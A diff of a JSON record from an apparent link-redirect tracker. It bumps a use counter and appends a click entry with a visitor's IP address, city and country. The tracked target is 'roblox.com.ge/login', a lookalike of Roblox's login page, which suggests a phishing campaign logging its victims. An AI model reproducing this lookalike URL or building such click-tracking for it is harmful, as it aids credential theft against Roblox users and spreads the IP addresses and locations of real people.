@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1647,
+    "useCount": 1648,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13344,6 +13344,14 @@
         "city": "Caruaru",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777573055844,
+        "ip": "112.198.226.59",
+        "country": "Philippines",
+        "city": "Iloilo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
